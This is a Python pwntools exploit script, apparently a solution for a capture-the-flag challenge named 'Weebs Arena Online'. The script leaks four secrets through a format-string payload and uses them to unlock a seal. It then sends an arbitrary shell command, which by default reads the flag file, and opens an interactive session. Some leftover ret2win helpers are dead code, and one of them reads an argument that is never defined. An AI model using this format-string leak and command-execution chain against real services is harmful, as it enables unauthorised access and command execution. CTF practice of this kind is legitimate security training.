#!/usr/bin/env python3
from pwn import *
import re
import argparse
import os

_binary_path = None
for _cand in ['./build/chal', './src/chal']:
    if os.path.exists(_cand):
        _binary_path = _cand
        break
# Avoid parsing non-ELF (e.g., macOS Mach-O). We'll run locally if available,
# but do not set context.binary to an ELF unless needed.
context.terminal = ['tmux', 'splitw', '-h']
context.update(arch='amd64', os='linux', endian='little')

def parse_args():
    ap = argparse.ArgumentParser(description='Exploit for Weebs Arena Online')
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', default=4012, type=int)
    ap.add_argument('--remote', action='store_true', help='Use remote host/port instead of local process')
    ap.add_argument('--cmd', default='cat /home/ctf/flag.txt', help='Command to run after unlocking')
    ap.add_argument('--debug', action='store_true')
    return ap.parse_args()

def start_conn(args):
    use_remote = args.remote or (args.host not in ('127.0.0.1', 'localhost'))
    if use_remote or not _binary_path:
        return remote(args.host, args.port)
    else:
        return process([_binary_path])

def recv_until_menu(io):
    data = io.recvuntil(b"=== Menu ===", drop=False)
    return data

def menu_select(io, num):
    io.sendlineafter(b'> ', str(num).encode())

def leak_canary_via_fmt(io):
    # Not needed for ret2win when stack canary is disabled
    return None

def candidate_paddings():
    # Try a broader range to account for different stack layouts
    return list(range(56, 113))

def resolve_win_address(args):
    if args.win:
        try:
            return int(args.win, 16)
        except ValueError:
            log.failure('Invalid --win address; use hex like 0x40123a')
            raise SystemExit(1)
    # Try to parse local ELF for symbol
    for cand in ['./build/chal', './src/chal']:
        if os.path.exists(cand):
            try:
                e = ELF(cand, checksec=False)
                if 'win' in e.symbols:
                    addr = e.symbols['win']
                    log.success(f"Resolved win() at {hex(addr)} from {cand}")
                    return addr
            except Exception:
                continue
    log.failure('Could not resolve win() address. Provide it via --win 0x...')
    raise SystemExit(1)

def verify_win(io, timeout=1.0):
    try:
        data = io.recvrepeat(timeout)
        if b"Flag:" in data or b"openCTF{" in data or b"open" in data:
            return True
        return False
    except Exception:
        return False

def pwn(args):
    print("Starting exploit (fmt+unlock+system)...")
    io = start_conn(args)
    recv_until_menu(io)

    # 1) Leak the four secrets via format string
    io.sendlineafter(b"> ", b"1")
    # Use %1$s..%4$s to print the secrets passed as variadic args
    io.sendlineafter(b"Speak your", b"%1$s|%2$s|%3$s|%4$s")
    data = io.recvuntil(b"=== Menu ===", drop=False)
    leak_match = re.search(br"([!-~]+)\|([!-~]+)\|([!-~]+)\|([!-~]+)", data)
    if not leak_match:
        log.failure("Failed to leak secrets")
        raise SystemExit(1)
    s1, s2, s3, s4 = [leak_match.group(i) for i in range(1,5)]
    log.success(f"Leaked secrets: {s1.decode(errors='ignore')}, {s2.decode(errors='ignore')}, {s3.decode(errors='ignore')}, {s4.decode(errors='ignore')}")

    # 2) Open the seal by answering with leaked secrets
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Secret #1: ", s1)
    io.sendlineafter(b"Secret #2: ", s2)
    io.sendlineafter(b"Secret #3: ", s3)
    io.sendlineafter(b"Secret #4: ", s4)
    io.recvuntil(b"The seal opens...", drop=False)
    recv_until_menu(io)

    # 3) Execute arbitrary command
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"What technique", args.cmd.encode())
    io.interactive()

if __name__ == '__main__':
    args = parse_args()
    if args.debug:
        context.log_level = 'debug'
    pwn(args)


